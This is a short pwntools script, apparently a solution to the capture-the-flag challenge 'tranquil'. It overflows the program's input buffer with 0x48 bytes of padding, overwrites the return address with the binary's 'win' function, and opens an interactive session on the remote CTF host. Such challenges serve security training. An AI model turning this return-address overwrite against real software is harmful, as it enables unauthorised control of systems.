from pwn import *

e = ELF("./tranquil")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("shell.actf.co", 21830)
else:
  p = process(e.path)
  #, env={"LD_PRELOAD": libc.path})

p.sendlineafter(":", "A" * 0x48 + p64(e.symbols["win"]))

debug()

p.interactive()
